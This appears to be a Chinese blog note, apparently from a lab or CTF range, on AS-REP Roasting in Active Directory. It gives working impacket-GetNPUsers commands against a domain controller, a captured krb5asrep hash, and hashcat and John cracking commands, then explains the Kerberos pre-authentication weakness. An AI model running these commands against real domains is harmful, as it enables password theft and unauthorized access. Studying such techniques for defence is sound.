<!-- https://blog.csdn.net/longlangci/article/details/131686439 -->

想办法获取域内用户名, 比如oa上收集同事信息
```bash
# username.txt
lixiuying@xiaorang.lab
...
lixiaoliang@xiaorang.lab
```

```bash
# 获取TGT票据
proxychains4 impacket-GetNPUsers -dc-ip 172.22.15.13 -usersfile username.txt xiaorang.lab/ 
# 破解
hashcat -m 18200 --force -a 0 '$krb5asrep$23$lixiuying@xiaorang.lab@XIAORANG.LAB:e5b9df0a854b830ce5f6e5ffe2499d71$d9d9dc060842070cd86a8ecae9e214d3a0ca14b815dc3c39e39c02a33d8e905757ff35a61a31e6dae59482b894e391be7ac67d4f7f484c37cc1dd80c93be6c30ac3a3e8217380170959db080a27cf29adff473385a7c554fe06c8512039f90255f853ce5be6e456377d5aec2530e674ac79c79bae51343f0150105c46703f0a7f1ba694e72c5b4d24aea907e04c33579b7601bda211fa28e0704115de88b9c073ab8863108a2013e8ec447163ec837615ca4dce0798bfdc3424400bdb37a5f0c0497ba4d7b4da0b56c726aca69ef6234ce75776b5bed88c814ec1d0b75b64cb38e94ff66ef5ef3b0a4b4ac8b' ./rockyou.txt 
john --wordlist=/usr/share/wordlists/rockyou.txt username.txt
```

# 介绍
* Kerberos 身份认证的第一个过程又被称为预身份验证，主要是为了防止域用户密码脱机爆破。
* 如果域用户关闭了预身份验证（"Do not require Kerberos preauthentication"）的话，攻击者可以使用指定的用户向域控制器发送 AS_REQ 请求。然后域控制器会返回 TGT 票据和加密的 Session-key 等信息。
因此攻击者就可以对获取到的加密 Session-key 进行离线破解，如果爆破成功，就能得到该指定用户的明文密码。这种攻击方式被称作 AS_REP Roasting 攻击。
